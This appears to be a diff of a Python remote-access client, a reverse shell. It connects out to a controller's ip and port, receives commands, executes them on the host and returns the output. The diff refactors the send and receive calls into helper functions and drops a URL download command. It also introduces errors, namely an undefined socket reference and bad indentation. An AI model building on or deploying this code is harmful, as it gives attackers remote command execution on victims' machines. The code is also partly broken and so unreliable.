@@ -1,6 +1,7 @@
 import socket
 import os
 import platform
+import http.server
 import utils
 
 
@@ -17,14 +18,15 @@ def main():
         s.connect((ip, port))
         
         while True:
-            cmd = s.recv(1024).decode('utf-8').rstrip('\n')
+            cmd = utils.recv_data(s)
 
             if cmd.strip() == 'exit':
-                s.sendall(b'[+] Terminating remote session.')
+                utils.send_data(s, b'[+] Terminating remote session.')
                 break
 
             out = handle_cmd(cmd)
-            s.sendall(out.encode('utf-8'))
+            utils.send_data(s, out)
+
     
 
 def handle_cmd(cmd):
@@ -42,40 +44,17 @@ def handle_cmd(cmd):
 
     # get system information
     if keyword == 'sys_info':
-        return sys_info()
-
-    # download a file
-    if keyword == 'download':
-        url = cmd.split('download')[1].strip()
-        try:
-            fname = utils.download(url)
-            return 'Sucessfully downloaded and saved to {fname}.'.format(fname=fname)
-        except:
-            return 'Unable to fetch ' + url
+        s.sendall(utils.sys_info())
 
     # upload a file
-
-    # execute the command as is
 
     # get an interactive shell
 
     # help
+
+    # execute command as is
     else:
-        return utils.execute_cmd(cmd)
-
-
-def sys_info():
-    info = ('OS: {os}'
-            '\nVersion: {version}'
-            '\nArchitecture: {arch}'
-            '\nNetwork Name: {name}\n'
-            ).format(os=platform.system(), 
-            version=platform.version(), 
-            arch=platform.machine(), 
-            name=platform.node())
-
-    return info
-
+       return utils.execute_cmd(cmd).decode()
 
 if __name__ == '__main__':
     main()
